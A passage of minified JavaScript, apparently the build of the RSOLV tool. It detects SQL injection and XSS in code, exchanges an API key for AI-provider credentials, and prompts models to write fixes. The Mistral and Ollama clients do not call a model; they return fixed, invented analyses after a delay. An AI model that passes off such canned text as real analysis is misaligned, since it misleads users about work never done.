Q=[];if(w1.isStringLiteral(J.left))Q.push(J.left.value);if(w1.isStringLiteral(J.right))Q.push(J.right.value);else if(w1.isIdentifier(J.right))Q.push("USER_INPUT");return Q.join("")}return""}hasConcatenatedUserInput(X){let J=X.node;if(!w1.isBinaryExpression(J))return!1;let Q=J.right;if(w1.isIdentifier(Q))return!0;if(w1.isMemberExpression(Q)&&w1.isMemberExpression(Q.object)){let Y=Q.object;if(w1.isIdentifier(Y.object)&&Y.object.name==="req"){let G=Y.property;return w1.isIdentifier(G)&&["params","query","body"].includes(G.name)}}return!1}isAssignedToQueryVariable(X){let J=X.parent;if(w1.isVariableDeclarator(J)&&J.init===X.node){if(w1.isIdentifier(J.id)){let Q=J.id.name.toLowerCase();return Q.includes("query")||Q.includes("sql")}}return!1}isInConsoleLog(X){return this.traverseAncestors(X,(J)=>{if(w1.isCallExpression(J)){let Q=J.callee;return w1.isMemberExpression(Q)&&w1.isIdentifier(Q.object)&&Q.object.name==="console"&&w1.isIdentifier(Q.property)&&Q.property.name==="log"}return!1},gF)}isOnlyUsedForLogging(X){let J=X.parent;if(w1.isVariableDeclarator(J)&&J.init===X.node&&w1.isIdentifier(J.id)){let Q=J.id.name,Y=X.scope.getBinding(Q);if(!Y)return!1;return Y.referencePaths.every((G)=>{return this.isInConsoleLog(G)})}return this.isInConsoleLog(X)}regexOnlyFallback(X,J,Q){let Y=[];for(let W of Q){let G=this.applyRegexPattern(J,W,X);Y.push(...G)}return Y}applyRegexPattern(X,J,Q){let Y=[],W=X.split(`
`);if(!J.patterns?.regex)return Y;for(let G of J.patterns.regex){let H;G.lastIndex=0;while((H=G.exec(X))!==null){let z=X.substring(0,H.index).split(`
`).length,$=W[z-1],V=H.index-X.lastIndexOf(`
`,H.index-1)-1;if(Y.push({pattern:J,file:Q,line:z,column:V,code:H[0],confidence:J.confidenceRules?.base||0.8}),H.index===G.lastIndex)G.lastIndex++}}return Y}}var uF,cF,w1,O3,yF,Uv1,Zv1=10,gF=5,qv1=0.7,Bv1=(X)=>typeof X.gc==="function",mF=(X)=>w1.isFunctionDeclaration(X)&&X.body!==null&&w1.isBlockStatement(X.body);var lF=s(()=>{uF=z0(y5(),1),cF=z0(K7(),1),w1=z0(y1(),1),O3=/\b(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\b/i,yF=["req","request","params","query","body"],Uv1=["query","execute","exec","run","all","get"]});var pF={};N0(pF,{securityDetector:()=>Mv1,SecurityDetectorV2:()=>nX});class nX{patternSource;cachedPatterns=new Map;astInterpreter;constructor(X){this.patternSource=X||C6(),this.astInterpreter=new F3}cleanup(){if(this.cachedPatterns.clear(),this.astInterpreter)this.astInterpreter.cleanup()}async detect(X,J,Q="unknown"){let Y=[],W=X.split(`
`),G=new Set;try{let H=await this.patternSource.getPatternsByLanguage(J);U.info(`SecurityDetectorV2: Analyzing ${J} code with ${H.length} patterns`);let z=H.filter((V)=>V.astRules),$=H.filter((V)=>!V.astRules);if(z.length>0){let V=await this.astInterpreter.scanFile(Q,X,z);for(let K of V){let Z=`${K.line}:${K.pattern.type}`;if(!G.has(Z)){G.add(Z);let q=K.confidence<=1?Math.round(K.confidence*100):Math.round(K.confidence);Y.push({type:K.pattern.type,severity:K.pattern.severity,line:K.line,message:`${K.pattern.name}: ${K.pattern.description}`,description:K.pattern.description,confidence:q,cweId:K.pattern.cweId,owaspCategory:K.pattern.owaspCategory,remediation:K.pattern.remediation})}}}for(let V of $)if(V.patterns.regex)for(let K of V.patterns.regex){let Z;K.lastIndex=0;while((Z=K.exec(X))!==null){let q=this.getLineNumber(X,Z.index),B=W[q-1]?.trim()||"";if(V.id==="ruby-sql-injection"&&J==="ruby")U.info(`Ruby SQL match found at line ${q}: "${B}"`);if(this.isSafeUsage(B,V.type)){if(V.id==="ruby-sql-injection"&&J==="ruby")U.info("  Skipped as safe usage");continue}let M=`${q}:${V.type}`;if(G.has(M))continue;G.add(M);let O={type:V.type,severity:V.severity,line:q,message:`${V.name}: ${V.description}`,description:V.description,confidence:this.getConfidence(B,V.type),cweId:V.cweId,owaspCategory:V.owaspCategory,remediation:V.remediation};if(V.id==="ruby-sql-injection"&&J==="ruby")U.info("  Adding vulnerability:",O);if(Y.push(O),!K.global)break}}}catch(H){U.error("Error detecting vulnerabilities:",H)}return Y}async detectIssues(X){return(await this.detect(X.content,X.language,X.filePath)).map((Q)=>({patternId:Q.cweId||`${Q.type}-001`,severity:Q.severity,line:Q.line,column:1,message:Q.message,description:Q.description,file:X.filePath,type:Q.type,remediation:Q.remediation,confidence:Q.confidence}))}async scanDirectory(X){return U.info(`SecurityDetectorV2: Starting directory scan of ${X}`),{vulnerabilities:[],summary:{total:0,byType:{},bySeverity:{}},metadata:{language:"unknown",linesScanned:0,scanDuration:0,timestamp:new Date().toISOString()}}}getLineNumber(X,J){return X.substring(0,J).split(`
`).length}isSafeUsage(X,J){if(X.includes("#{")&&X.includes("}"))return!1;if(/params\s*\[\s*:/.test(X))return!1;return({sql_injection:[/\?/,/\$\d+/,/:\w+(?!\s*\])/,/prepare\s*\(/i,/setParameter/i,/bindParam/i],xss:[/escape/i,/sanitize/i,/encode/i,/textContent/,/innerText/,/createTextNode/],command_injection:[/escapeshellarg/i,/escapeshellcmd/i,/quote/i]}[J]||[]).some((W)=>W.test(X))}getConfidence(X,J){if(({sql_injection:[/\+\s*req\./,/\+\s*request\./,/\$\{.*req\./,/`.*\$\{.*req\./],xss:[/innerHTML\s*=\s*[^'"]*req\./,/document\.write\s*\([^)]*req\./,/\$\([^)]+\)\.html\s*\([^)]*req\./]}[J]||[]).some((W)=>W.test(X)))return 90;if(this.isSafeUsage(X,J))return 30;return 60}}var Mv1;var P7=s(()=>{TX();k8();I1();lF();Mv1=new nX});class x6{baseUrl;apiKey;constructor(X){if(typeof X==="string")this.apiKey=X,this.baseUrl=process.env.RSOLV_API_URL||"https://api.rsolv.dev";else this.baseUrl=X.baseUrl,this.apiKey=X.apiKey}async createFixAttempt(X){let J={github_org:X.repository_full_name?.split("/")[0]||"unknown",repo_name:X.repository_full_name?.split("/")[1]||"unknown",issue_number:X.issue_number,pr_number:parseInt(X.github_pr_url?.split("/").pop()||"0"),pr_title:X.issue_title||"RSOLV Fix",pr_url:X.github_pr_url,issue_title:X.issue_title,issue_url:X.github_issue_url,api_key_used:this.apiKey,metadata:{ai_provider:X.ai_provider,ai_model:X.ai_model,security_vulnerabilities_found:X.security_vulnerabilities_found,estimated_time_saved_hours:X.estimated_time_saved_hours}};return this.recordFixAttempt(J)}async recordFixAttempt(X){try{let J=await fetch(`${this.baseUrl}/api/v1/fix-attempts`,{method:"POST",headers:{"Content-Type":"application/json","x-api-key":this.apiKey},body:JSON.stringify(X)});if(J.ok)return{success:!0,data:await J.json()};else{let Q=await J.json();return{success:!1,error:`API Error: ${J.status} - ${JSON.stringify(Q)}`}}}catch(J){return{success:!1,error:J instanceof Error?J.message:"Unknown error"}}}async validateVulnerabilities(X){let J=await fetch(`${this.baseUrl}/api/v1/vulnerabilities/validate`,{method:"POST",headers:{"Content-Type":"application/json","x-api-key":this.apiKey},body:JSON.stringify(X)});if(!J.ok){let Q=await J.text();throw Error(`Validation API error: ${J.status} - ${Q}`)}return J.json()}}import*as h4 from"path";import*as D3 from"fs/promises";class ZX{VENDOR_PATTERNS=["node_modules","vendor","bower_components","jspm_packages","packages","third_party","external","libs","dependencies","dist"];MINIFIED_PATTERNS=[".min.js","-min.js",".bundle.js",".min.css","-min.css"];VENDOR_INDICATORS={filePatterns:[/jquery[.-]?([\d.]+)?(?:\.min)?\.js$/i,/bootstrap[.-]?([\d.]+)?(?:\.min)?\.(?:js|css)$/i,/angular[.-]?([\d.]+)?(?:\.min)?\.js$/i,/react[.-]?([\d.]+)?(?:\.min)?\.js$/i,/vue[.-]?([\d.]+)?(?:\.min)?\.js$/i,/lodash[.-]?([\d.]+)?(?:\.min)?\.js$/i,/moment[.-]?([\d.]+)?(?:\.min)?\.js$/i],headerComments:[/\/\*!?\s*jQuery\s+v?([\d.]+)/i,/\/\*!?\s*Bootstrap\s+v?([\d.]+)/i,/\/\*!?\s*Angular\s+v?([\d.]+)/i,/\/\*!?\s*React\s+v?([\d.]+)/i,/\/\*!?\s*Vue\.js\s+v?([\d.]+)/i,/Copyright\s+\(c\)\s+.*\s+Foundation/i,/Licensed\s+under\s+MIT/i,/\/\*!?\s*\w+\.js\s+v?\d+\.\d+\.\d+/]};async isVendorFile(X){if(this.matchesVendorPattern(X))return!0;if(this.isMinified(X))return!0;if(this.matchesKnownLibrary(X))return!0;return!1}async containsVendorIndicators(X,J){if(J)return this.hasVendorHeader(J);try{let Y=(await D3.readFile(X,"utf-8")).substring(0,500);return this.hasVendorHeader(Y)}catch{return!1}}async identifyLibrary(X,J){if(!(await this.isVendorFile(X)||J&&this.hasVendorHeader(J)))return null;if(J){let W=this.extractFromHeader(J);if(W)return W}let Y=this.extractFromPath(X);if(Y)return Y;if(!J)try{let G=(await D3.readFile(X,"utf-8")).substring(0,500);return this.extractFromHeader(G)}catch{}return{name:"unknown-vendor",version:"unknown"}}matchesVendorPattern(X){let J=X.replace(/\\/g,"/");return this.VENDOR_PATTERNS.some((Q)=>J.includes(`/${Q}/`)||J.includes(`${Q}/`))}isMinified(X){let J=h4.basename(X).toLowerCase();return this.MINIFIED_PATTERNS.some((Q)=>J.includes(Q))}matchesKnownLibrary(X){let J=h4.basename(X);return this.VENDOR_INDICATORS.filePatterns.some((Q)=>Q.test(J))}hasVendorHeader(X){return this.VENDOR_INDICATORS.headerComments.some((J)=>J.test(X))}extractFromPath(X){let J=h4.basename(X);for(let Y of this.VENDOR_INDICATORS.filePatterns){let W=J.match(Y);if(W){let G=this.getLibraryNameFromPattern(Y),H=W[1]||"unknown";return{name:G,version:H}}}let Q=J.match(/^([\w-]+)[.-]([\d.]+)(?:\.min)?\.(?:js|css)$/);if(Q)return{name:Q[1].toLowerCase(),version:Q[2]};return null}extractFromHeader(X){let J=X.match(/\/\*!?\s*Bootstrap\s+v?([\d.]+)(?:\s+\([^)]+\))?/i);if(J)return{name:"bootstrap",version:J[1]||"unknown"};for(let Q of this.VENDOR_INDICATORS.headerComments){let Y=X.match(Q);if(Y){let W=this.getLibraryNameFromHeader(X,Q),G=Y[1]||"unknown";if(W)return{name:W.toLowerCase(),version:G}}}return null}getLibraryNameFromPattern(X){let Q=X.source.match(/^(\w+)/);return Q?Q[1].toLowerCase():"unknown"}getLibraryNameFromHeader(X,J){let Q=J.source;if(Q.includes("jQuery"))return"jquery";if(Q.includes("Bootstrap"))return"bootstrap";if(Q.includes("Angular"))return"angular";if(Q.includes("React"))return"react";if(Q.includes("Vue"))return"vue";let Y=X.match(/\/\*!?\s*(\w+)(?:\.js)?\s+v/i);if(Y)return Y[1].toLowerCase();return null}}var S7=()=>{};class L3{credentials=new Map;apiKey=null;refreshTimers=new Map;rsolvApiUrl=process.env.RSOLV_API_URL||"https://api.rsolv.ai";async initialize(X){this.apiKey=X,U.info("Initializing RSOLV credential manager");try{let J={api_key:X,providers:["anthropic","openai","openrouter"],ttl_minutes:60};U.info(`Requesting credential exchange from ${this.rsolvApiUrl}/api/v1/credentials/exchange`);let Q=await fetch(`${this.rsolvApiUrl}/api/v1/credentials/exchange`,{method:"POST",headers:{"x-api-key":X,"Content-Type":"application/json","X-GitHub-Job":process.env.GITHUB_JOB||"","X-GitHub-Run":process.env.GITHUB_RUN_ID||""},body:JSON.stringify(J),signal:AbortSignal.timeout(15000)});if(!Q.ok){let W=await Q.json();throw U.error(`Credential exchange failed - Status: ${Q.status}, Body:`,W),Error(`Failed to exchange credentials: ${W.error||Q.statusText}`)}let Y=await Q.json();if(!Y||!Y.credentials)throw U.error("Invalid credential exchange response:",Y),Error("Invalid response from credential exchange API");if(Object.entries(Y.credentials).forEach(([W,G])=>{U.debug(`Storing credential for ${W}`,{hasApiKey:!!G.api_key,apiKeyLength:G.api_key?.length||0,expiresAt:G.expires_at}),this.credentials.set(W,G)}),Y.usage?.remaining_fixes!==void 0)U.info(`Credentials initialized. Remaining fixes: ${Y.usage.remaining_fixes}`);else U.info("Credentials initialized")}catch(J){throw U.error("Failed to initialize credentials",J),J}}async getCredential(X){let J=this.credentials.get(X);if(U.debug(`Getting credential for ${X}`,{hasCredential:!!J,hasApiKey:!!J?.api_key,apiKeyLength:J?.api_key?.length||0}),!J)throw Error(`No valid credential for ${X}`);if(new Date(J.expires_at)<new Date){U.info(`Credential for ${X} expired, refreshing...`),await this.refreshCredentials();let Y=this.credentials.get(X);if(!Y||!Y.api_key)throw Error(`Failed to refresh credential for ${X}`);return Y.api_key}if(!J.api_key)throw Error(`Credential for ${X} has no API key`);return J.api_key}async refreshCredentials(){if(!this.apiKey)throw Error("Cannot refresh credentials: API key not set");U.info("Refreshing expired credentials");try{let X={api_key:this.apiKey,providers:["anthropic","openai","openrouter"],ttl_minutes:60},J=await fetch(`${this.rsolvApiUrl}/api/v1/credentials/exchange`,{method:"POST",headers:{"x-api-key":this.apiKey,"Content-Type":"application/json","X-GitHub-Job":process.env.GITHUB_JOB||"","X-GitHub-Run":process.env.GITHUB_RUN_ID||""},body:JSON.stringify(X),signal:AbortSignal.timeout(15000)});if(!J.ok){let Y=await J.json();throw U.error(`Credential refresh failed - Status: ${J.status}, Body:`,Y),Error(`Failed to refresh credentials: ${Y.error||J.statusText}`)}let Q=await J.json();if(!Q||!Q.credentials)throw U.error("Invalid credential refresh response:",Q),Error("Invalid response from credential refresh API");Object.entries(Q.credentials).forEach(([Y,W])=>{U.debug(`Refreshed credential for ${Y}`,{hasApiKey:!!W.api_key,apiKeyLength:W.api_key?.length||0,expiresAt:W.expires_at}),this.credentials.set(Y,W)}),U.info("Successfully refreshed credentials")}catch(X){throw U.error("Failed to refresh credentials:",X),X}}async reportUsage(X,J){try{let Q=await fetch(`${this.rsolvApiUrl}/api/v1/usage/report`,{method:"POST",headers:{"x-api-key":this.apiKey||"","Content-Type":"application/json"},body:JSON.stringify({provider:X,tokens_used:J.tokensUsed,request_count:J.requestCount,job_id:process.env.GITHUB_JOB}),signal:AbortSignal.timeout(1e4)});if(!Q.ok)U.warn(`Failed to report usage for ${X}: ${Q.statusText}`)}catch(Q){U.warn(`Error reporting usage for ${X}:`,Q)}}cleanup(){this.refreshTimers.forEach((X)=>clearTimeout(X)),this.refreshTimers.clear(),this.credentials.clear(),U.info("Credential manager cleaned up")}}var aF=s(()=>{I1()});var YJ={};N0(YJ,{CredentialManagerSingleton:()=>g4});var g4;var sX=s(()=>{aF();I1();g4=class g4{static instances=new Map;static initPromises=new Map;static async getInstance(X){if(this.instances.has(X))return U.debug("Reusing existing credential manager for API key"),this.instances.get(X);if(this.initPromises.has(X))return U.debug("Waiting for in-progress initialization for API key"),this.initPromises.get(X);let J=this.createAndInitializeManager(X);this.initPromises.set(X,J);try{return await J}finally{this.initPromises.delete(X)}}static async createAndInitializeManager(X){U.info("Creating new credential manager instance");let J=new L3;try{return await this.initializeWithRetry(J,X),this.instances.set(X,J),J}catch(Q){throw J.cleanup(),Q}}static async initializeWithRetry(X,J,Q=3){let Y=null;for(let W=1;W<=Q;W++)try{U.debug(`Initializing credential manager (attempt ${W}/${Q})`),await X.initialize(J);return}catch(G){if(Y=G,U.warn(`Credential initialization failed (attempt ${W}/${Q}): ${Y.message}`),W<Q){let H=1000*Math.pow(2,W-1);U.debug(`Waiting ${H}ms before retry`),await new Promise((z)=>setTimeout(z,H))}}throw Error(`Failed to initialize credentials after ${Q} attempts: ${Y?.message}`)}static clearInstance(X){let J=this.instances.get(X);if(J)J.cleanup(),this.instances.delete(X),U.debug("Cleared credential manager instance for API key");this.initPromises.delete(X)}static cleanup(){U.info(`Cleaning up ${this.instances.size} credential manager instances`),this.instances.forEach((X)=>X.cleanup()),this.instances.clear(),this.initPromises.clear()}static getInstanceCount(){return this.instances.size}}});function S9(X){let J=X;J=J.replace(/https?:\/\/api\.[a-zA-Z0-9.-]+\.(com|ai|dev|io)(\/[a-zA-Z0-9/\-._~:/?#[\]@!$&'()*+,;=]*)?/gi,"API endpoint"),J=J.replace(/\b(sk-proj-|sk-|ant_|key[:\s]+)[a-zA-Z0-9_\-]{8,}/gi,"API credential"),J=J.replace(/\b(api[_-]?key|token|secret|credential)([:\s]+)[a-zA-Z0-9_\-]{8,}/gi,"$1$2[REDACTED]"),J=J.replace(/\b[A-Z][A-Z0-9_]*_API_KEY\b/g,"API_KEY"),J=J.replace(/\b(claude-[0-9a-z\-\.]+|gpt-[0-9a-z\-\.]+|text-davinci-[0-9]+)\b/gi,"AI model");let Y=new RegExp(`\\b(${["anthropic","claude","openai","gpt","mistral","ollama","gemini","bard"].join("|")})\\b`,"gi");if(J=J.replace(Y,"AI provider"),J.includes("Failed to connect to"))J=J.replace(/Failed to connect to .+ API/g,"Failed to connect to AI provider API");return J=J.replace(/\/v\d+\/[a-zA-Z]+/g,"/api/endpoint"),J=J.replace(/\/chat\/completions/g,"/api/endpoint"),J=J.replace(/\s+/g," ").trim(),J=J.replace(/AI provider provider/gi,"AI provider"),J=J.replace(/API credential credential/gi,"API credential"),J}function T7(X,J,Q="STANDARD"){if(X.maxTokens!==void 0)return X.maxTokens;if(J.maxTokens!==void 0)return J.maxTokens;let Y=J?.model?.toLowerCase();if(Y?.includes("sonnet-4"))return I3[Q];else if(Y?.includes("sonnet")){let W=I3[Q];return Math.min(W,8000)}return I3[Q]}function nF(X){if(X<=0)throw Error(`Invalid token limit: ${X}. Must be positive.`);if(X>200000)throw Error(`Token limit too high: ${X}. Maximum is 200,000.`)}function sF(X,J){let Q=J?.model?.toLowerCase();if(Q?.includes("sonnet-4")){let W=T7(X,J,"TEST_GENERATION");return nF(W),W}else if(Q?.includes("sonnet"))return 8000;let Y=T7(X,J,"TEST_GENERATION");return nF(Y),Y}var I3;var C3=s(()=>{I3={STANDARD:4000,TEST_GENERATION:1e4,CODE_ANALYSIS:8000,FIX_GENERATION:16000}});async function qX(X){let J=null;if(X.useVendedCredentials)try{let Q=process.env.RSOLV_API_KEY;if(!Q)throw Error("RSOLV_API_KEY environment variable not set for vended credentials");U.info("Getting credential manager singleton for vended credentials"),J=await g4.getInstance(Q),U.info("Credential manager singleton retrieved successfully")}catch(Q){throw U.error("Failed to get credential manager singleton",Q),Q}switch(X.provider.toLowerCase()){case"openai":return new oF(X,J);case"anthropic":case"claude-code":return new tF(X,J);case"mistral":return new eF(X,J);case"ollama":return new XR(X,J);default:throw Error(`Unsupported AI provider: ${X.provider}`)}}class oF{config;credentialManager;constructor(X,J){if(this.config=X,this.credentialManager=J,!X.useVendedCredentials&&!X.apiKey)throw Error("AI provider API key is required")}async complete(X,J={}){try{return U.debug("Sending request to AI provider",{prompt:X.substring(0,100)+"..."}),await this.makeApiCall(X,J)}catch(Q){throw U.error("AI provider API error",Q),Error(S9(`AI provider error: ${Q instanceof Error?Q.message:String(Q)}`))}}async makeApiCall(X,J){try{let Q=this.config.baseUrl||"https://api.openai.com/v1",Y=J.model||this.config.model||"gpt-4",W=J.temperature??this.config.temperature??0.2,G=T7(J,this.config,"STANDARD"),H={model:Y,messages:[{role:"user",content:X}],temperature:W,max_tokens:G,frequency_penalty:J.frequencyPenalty??0,presence_penalty:J.presencePenalty??0},z;try{z=this.config.useVendedCredentials?await this.credentialManager?.getCredential("openai"):this.config.apiKey}catch(Z){throw Error("Failed to retrieve API key")}if(!z)throw Error("Failed to retrieve API key");let $=await fetch(`${Q}/chat/completions`,{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${z}`},body:JSON.stringify(H)});if(!$.ok){let Z=await $.json().catch(()=>({}));throw Error(S9(`AI provider error (${$.status}): ${Z.error?.message||$.statusText}`))}let V=await $.json(),K=V.choices[0]?.message?.content||"";if(this.config.useVendedCredentials&&this.credentialManager){let Z=V.usage?.total_tokens||0;await this.credentialManager.reportUsage("openai",{tokensUsed:Z,requestCount:1})}return K}catch(Q){throw U.error("Error calling AI provider API",Q),Q}}getMockResponse(X){return`Analysis of the issue:

This appears to be a bug in the authentication system where token validation is failing for valid tokens that contain special characters. The issue is likely in the token parsing logic.

Files to modify:
- \`src/auth/tokenValidator.js\`
- \`src/utils/stringEscaping.js\`

Suggested Approach:
The token validator is not properly handling URL-encoded characters. We need to update the validation function to properly decode tokens before validation, and ensure that special characters are correctly handled throughout the authentication flow.`}}class tF{config;credentialManager;constructor(X,J){if(this.config=X,this.credentialManager=J,!X.useVendedCredentials&&!X.apiKey)throw Error("AI provider API key is required")}async complete(X,J={}){try{return U.debug("Sending request to AI provider",{prompt:X.substring(0,100)+"..."}),await this.makeApiCall(X,J)}catch(Q){throw U.error("AI provider API error",Q),Error(S9(`AI provider error: ${Q instanceof Error?Q.message:String(Q)}`))}}async makeApiCall(X,J){try{let Q=this.config.baseUrl||"https://api.anthropic.com",Y=J.model||this.config.model||"claude-3-sonnet-20240229",W=J.temperature??this.config.temperature??0.2,G=T7(J,this.config,"STANDARD"),H={model:Y,messages:[{role:"user",content:X}],temperature:W,max_tokens:G};U.info(`[API Request Debug] Model: ${Y}, Temperature: ${W}, MaxTokens: ${G}`),U.info(`[API Request Debug] Prompt length: ${X.length} characters`),U.debug(`[API Request Debug] Prompt preview (first 500 chars): ${X.substring(0,500)}`),U.debug(`[API Request Debug] Using vended credentials: ${this.config.useVendedCredentials}`);let z;try{if(this.config.useVendedCredentials){if(U.debug(`Attempting to get vended credential - credentialManager exists: ${!!this.credentialManager}`),!this.credentialManager)throw Error("Credential manager not initialized for vended credentials");z=await this.credentialManager.getCredential("anthropic")}else z=this.config.apiKey}catch(Z){throw U.error("Failed to get API key",{useVended:this.config.useVendedCredentials,hasCredentialManager:!!this.credentialManager,error:Z instanceof Error?Z.message:String(Z)}),Error(`Failed to retrieve API key: ${Z instanceof Error?Z.message:String(Z)}`)}if(!z)throw Error("Failed to retrieve API key - key is empty");let $=await fetch(`${Q}/v1/messages`,{method:"POST",headers:{"Content-Type":"application/json","X-API-Key":z,"anthropic-version":"2023-06-01"},body:JSON.stringify(H)});if(!$.ok){let Z=await $.json().catch(()=>({}));throw Error(S9(`AI provider error (${$.status}): ${Z.error?.message||$.statusText}`))}let V=await $.json(),K=V.content?.[0]?.text||"";if(U.info(`[API Response Debug] Status: ${$.status}, Model: ${Y}`),U.info(`[API Response Debug] Requested maxTokens: ${G}`),U.info(`[API Response Debug] Response usage - input: ${V.usage?.input_tokens}, output: ${V.usage?.output_tokens}, total: ${V.usage?.total_tokens}`),U.info(`[API Response Debug] Response length: ${K.length} characters`),U.info(`[API Response Debug] Stop reason: ${V.stop_reason}`),V.stop_reason==="max_tokens")U.warn(`[API Response Debug] Response truncated at max_tokens limit! Output tokens: ${V.usage?.output_tokens}`);if(K.length>200)U.debug(`[API Response Debug] Response tail: ${K.substring(K.length-200)}`);if(this.config.useVendedCredentials&&this.credentialManager){let Z=V.usage?.total_tokens||0;await this.credentialManager.reportUsage("anthropic",{tokensUsed:Z,requestCount:1})}return K}catch(Q){throw U.error("Error calling AI provider API",Q),Q}}getMockResponse(X){return`Based on my analysis, this is a performance issue in the data processing pipeline.

The main bottleneck appears to be in the file processing function that's not properly streaming large files, leading to excessive memory usage.

Files that need modification:
- \`src/services/fileProcessor.js\`
- \`src/utils/streamHandler.js\`

This is a medium complexity issue that will require implementing proper stream processing instead of loading the entire file into memory. The fix should significantly reduce memory usage and improve processing speed.`}}class eF{config;credentialManager;constructor(X,J){if(this.config=X,this.credentialManager=J,!X.useVendedCredentials&&!X.apiKey)throw Error("AI provider API key is required")}async complete(X,J={}){try{return U.debug("Sending request to AI provider",{prompt:X.substring(0,100)+"..."}),await this.simulateApiCall(X,J)}catch(Q){throw U.error("AI provider API error",Q),Error(S9(`AI provider error: ${Q instanceof Error?Q.message:String(Q)}`))}}async simulateApiCall(X,J){return await new Promise((Q)=>setTimeout(Q,550)),`This is a documentation issue where the installation instructions are unclear for Windows users.

The documentation needs to be updated to include Windows-specific commands and requirements.

Files to modify:
- \`docs/installation.md\`
- \`README.md\`

This is a simple fix that involves adding a new section for Windows installation instructions, including how to set up the environment variables correctly and handle path differences.`}}class XR{config;credentialManager;constructor(X,J){this.config=X,this.credentialManager=J}async complete(X,J={}){try{return U.debug("Sending request to AI provider",{prompt:X.substring(0,100)+"..."}),await this.simulateApiCall(X,J)}catch(Q){throw U.error("AI provider API error",Q),Error(S9(`AI provider error: ${Q instanceof Error?Q.message:String(Q)}`))}}async simulateApiCall(X,J){return await new Promise((Q)=>setTimeout(Q,1000)),`I've analyzed the feature request for adding pagination to the API endpoints.

This is a medium complexity task that will require modifying multiple files:
- \`src/controllers/userController.js\`
- \`src/services/queryService.js\`
- \`src/middleware/pagination.js\` (new file needed)

The approach should be to create a reusable pagination middleware that can be applied to all list endpoints. This will require updating the query service to support limit and offset parameters, and updating the controllers to use the new middleware.`}}var _7=s(()=>{I1();sX();C3()});function JR(X){return`I need you to analyze the following software issue and provide a technical assessment.

Issue Title: ${X.title}

Issue Description:
${X.body}

Repository: ${X.repository.fullName}
Primary Language: ${X.repository.language||"Unknown"}

Please provide:
1. A determination of what type of issue this is (bug, feature request, refactoring, etc.)
2. Which files are likely to need modification
3. An estimate of the complexity (simple, medium, complex)
4. A suggested approach to solve the issue

Focus on technical details and be specific about the implementation approach. If the issue description lacks critical information, note what additional context would be needed.`}function QR(X,J,Q){let Y=`I need you to generate a solution for the following software issue:

Issue Title: ${X.title}

Issue Description:
${X.body}

Repository: ${X.repository.fullName}
Primary Language: ${X.repository.language||"Unknown"}

Based on my analysis, this is a ${J.issueType} issue with ${J.estimatedComplexity} complexity.

The suggested approach is: ${J.suggestedApproach}

I need you to generate specific code changes to resolve this issue. Here are the relevant files with their current content:
`;for(let[W,G]of Object.entries(Q))Y+=`
--- ${W} ---
\`\`\`
${G}
\`\`\`
`;return Y+=`
IMPORTANT: Format your response EXACTLY as shown below for proper parsing:

CRITICAL: You MUST modify EXISTING files only. DO NOT create new files. Make changes in-place to fix the vulnerability.

For each file that needs to be modified, use one of these formats:

Option 1 (preferred):
filename.ext:
\`\`\`language
[complete file content]
\`\`\`

Option 2:
--- filename.ext ---
\`\`\`language
[complete file content]
\`\`\`

Example:
src/auth/login.js:
\`\`\`javascript
function authenticateUser(username, password) {
  // secure implementation here
}
\`\`\`

CRITICAL: The parser requires EXACT formatting. Use one of the above formats or the solution will fail.

After all file changes, add:
1. Brief explanation of changes
2. How this fixes the issue
3. Any assumptions made

Provide complete, working code following existing patterns.`,Y}function YR(X,J,Q){let Y=Object.keys(Q).join(", ");return`I need you to generate a clear, professional pull request description for the following changes.

Issue: ${X.title} (#${X.number})

Issue Type: ${J.issueType}
Complexity: ${J.estimatedComplexity}

Files modified: ${Y}

Approach taken: ${J.suggestedApproach}

Please generate a pull request description with:
1. A clear, concise title that summarizes the change
2. A detailed description explaining what was changed and why
3. Any testing instructions or considerations for reviewers
4. References to the original issue

Keep the tone professional but friendly, and focus on the technical details that would be relevant to code reviewers.`}function WR(X){switch(X){case"bug":return"For this bug fix, focus on identifying the root cause first before implementing a solution. Consider edge cases and ensure your fix doesn't introduce regressions. Include tests that verify the fix works as expected.";case"feature":return"For this feature implementation, ensure the solution is well-integrated with the existing architecture. Consider backward compatibility, error handling, and appropriate documentation. Include tests for the new functionality.";case"refactoring":return"For this refactoring task, maintain identical functionality while improving the code structure. Focus on readability, maintainability, and adherence to design principles. Ensure tests pass before and after your changes.";case"performance":return"For this performance improvement, focus on identifying bottlenecks and optimizing critical paths. Consider time and space complexity, and measure before/after metrics where possible. Be careful not to sacrifice code readability for marginal gains.";case"security":return"For this security issue, approach with extra caution. Ensure the fix addresses the root vulnerability completely without introducing new attack vectors. Consider all possible exploit scenarios and follow security best practices.";case"documentation":return"For this documentation task, focus on clarity, completeness, and accuracy. Ensure examples are working and up-to-date. Consider both beginner and advanced users, and follow any documentation style guidelines present in the project.";case"dependency":return"For this dependency update, carefully check for breaking changes and necessary adjustments to the codebase. Update any affected tests and documentation. Consider whether the update brings security fixes that should be highlighted.";case"test":return"For this testing task, ensure comprehensive coverage of edge cases and typical usage patterns. Follow existing testing patterns and naming conventions. Consider both unit and integration tests as appropriate for the code being tested.";default:return"For this task, ensure your solution is well-integrated with the existing codebase and follows the project's coding conventions. Include appropriate error handling, documentation, and tests."}}var GR={};N0(GR,{analyzeIssue:()=>Z6});async function Z6(X,J,Q){if(U.info(`Analyzing issue #${X.number} with AI`),process.env.RSOLV_DEV_MODE==="true"&&process.env.RSOLV_USE_CLAUDE_MAX==="true"&&!Q)return U.info("Development mode with Claude Max - using simplified analysis"),{issueType:P3(X),filesToModify:Iv1(X),estimatedComplexity:"medium",requiredContext:[],suggestedApproach:"Fix security vulnerability using Claude Code Max",confidenceScore:0.8,canBeFixed:!0};let W=Q||await qX(J.aiProvider),G=JR(X);try{let H=await W.complete(G,{temperature:J.aiProvider.temperature||0.2,maxTokens:J.aiProvider.maxTokens,model:J.aiProvider.model});return U.debug("AI analysis response received",{response:H}),Lv1(H,X)}catch(H){throw U.error("Error analyzing issue with AI",H),Error(`AI analysis failed: ${H instanceof Error?H.message:String(H)}`)}}function Lv1(X,J){try{U.info(`AI analysis response for issue #${J.number}:`,X.substring(0,500));try{let K=JSON.parse(X);if(K&&typeof K==="object")return{issueType:K.issueType||P3(J),filesToModify:Array.isArray(K.filesToModify)?K.filesToModify:[],estimatedComplexity:K.estimatedComplexity||"medium",requiredContext:K.requiredContext||[],suggestedApproach:K.suggestedApproach||"",confidenceScore:K.confidenceScore||0.7,canBeFixed:K.canBeFixed!==void 0?K.canBeFixed:!0}}catch(K){U.debug("Response is not JSON, using text parsing")}let 